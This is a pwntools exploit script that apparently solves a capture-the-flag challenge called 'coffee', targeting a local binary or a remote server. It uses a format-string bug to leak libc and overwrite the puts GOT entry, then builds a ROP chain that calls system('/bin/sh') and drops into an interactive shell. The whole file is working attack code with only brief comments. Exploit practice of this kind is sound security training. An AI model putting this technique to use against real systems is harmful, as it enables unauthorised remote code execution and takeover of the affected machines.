#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./coffee')

if args.REMOTE:
	p = remote('34.146.101.4', 30002)
	libc = ELF('./libc.so.6')
else:
	p = process(binary.path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

whitespace = b'\f\t\r\n\v '
offset = 6
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
pop_sled = binary.search(asm('pop rbp; pop r12; pop r13; pop r14; pop r15; ret')).__next__()

# 1st pass
# leak libc
# puts -> pop_sled to mov rsp to our rop chain
# ropchain -> just _start over
payload  = b''
payload += b'%29$018p'
payload += fmtstr_payload(offset+1,{binary.got.puts:pop_sled}, write_size='int', numbwritten=18)
fmtstr_len = len(payload) # padding for next rop chain
payload += p64(binary.sym._start)

p.sendline(payload)

libc.address = int(p.recv(18).decode(),16) - libc.sym.__libc_start_main - 243
log.info('libc.address: ' + hex(libc.address))

# capture the garbage
if args.REMOTE:
	null = payload.find(b'\x00')
	p.recvuntil(payload[null-2:null])
else:
	p.recvuntil(b'\n')

# 2nd pass
# get a shell
payload  = b''
payload += fmtstr_len * b'A'
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

if any(x in payload for x in whitespace):
	log.critical('whitespace in payload! exiting! try again!')
	sys.exit(1)

p.sendline(payload)
p.interactive()